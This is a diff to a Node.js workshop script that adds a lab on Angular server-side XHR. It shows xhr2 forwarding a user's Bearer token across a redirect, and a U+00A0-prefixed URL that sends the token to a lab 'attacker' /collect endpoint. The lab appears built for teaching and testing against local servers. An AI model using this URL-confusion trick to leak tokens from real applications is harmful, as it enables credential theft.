@@ -1,8 +1,11 @@
 // Labs 2, 3 and 4 without typing curl on stage. Needs the stack running (npm start).
 //   node tools/labs.mjs host       Lab 2: the Host header steers SSR requests
 //   node tools/labs.mjs redirect   Lab 3: a custom header follows a redirect
+//   node tools/labs.mjs xhr        XHR on the server: what xhr2 does that fetch does not
 //   node tools/labs.mjs cache      Lab 4: Ana's render served to someone else
-import { captures, clearCaptures, rawGet, signIn } from './client.mjs';
+import XMLHttpRequest from 'xhr2';
+import { captures, clearCaptures, rawGet, session, signIn } from './client.mjs';
+import { URLS } from './servers.mjs';
 
 const RED = '\x1b[31m';
 const GREEN = '\x1b[32m';
@@ -10,7 +13,7 @@ const DIM = '\x1b[2m';
 const BOLD = '\x1b[1m';
 const RESET = '\x1b[0m';
 
-const labs = { host, redirect, cache };
+const labs = { host, redirect, xhr, cache };
 const name = process.argv[2];
 if (!labs[name]) {
   console.error(`Usage: node tools/labs.mjs <${Object.keys(labs).join('|')}>`);
@@ -52,6 +55,50 @@ async function redirect() {
     console.log(`${RED}The page shows whatever the campaign site serves now.${RESET}`);
   }
   await printCaptures();
+}
+
+/**
+ * `withXhr()` on the server uses xhr2 (ServerXhr, deprecated since 22.0.1). Same Bearer token,
+ * same 302 to another origin: fetch drops Authorization, xhr2 forwards it. Then the URL from
+ * angular/angular#70540: WHATWG reads it as same-origin, xhr2 sends it somewhere else.
+ */
+async function xhr() {
+  const { accessToken } = await session('ana');
+  const authorization = `Bearer ${accessToken}`;
+  const api = `${URLS.api}/deals/today`;
+
+  console.log(`${DIM}Same request with Ana's Bearer token. The API answers 302 to another origin.${RESET}`);
+  for (const [name, send] of [
+    ['fetch', fetchGet],
+    ['xhr2 ', xhrGet],
+  ]) {
+    await clearCaptures();
+    command(`${name} GET ${api}`);
+    await send(api, authorization);
+    await printCaptures();
+  }
+
+  const url = `\u00A0${URLS.attacker}/collect?lab=xhr`;
+  console.log(`\n${DIM}A URL that starts with U+00A0, a no-break space.${RESET}`);
+  console.log(`new URL() resolves it to ${new URL(url, URLS.shop).href}  ${GREEN}same origin${RESET}`);
+  await clearCaptures();
+  command(`xhr2  GET "\\u00A0${URLS.attacker}/collect?lab=xhr"`);
+  await xhrGet(url, authorization);
+  await printCaptures();
+}
+
+async function fetchGet(url, authorization) {
+  await fetch(url, { headers: { authorization } });
+}
+
+function xhrGet(url, authorization) {
+  return new Promise((resolve) => {
+    const request = new XMLHttpRequest();
+    request.open('GET', url);
+    request.setRequestHeader('authorization', authorization);
+    request.onloadend = resolve;
+    request.send();
+  });
 }
 
 async function cache() {
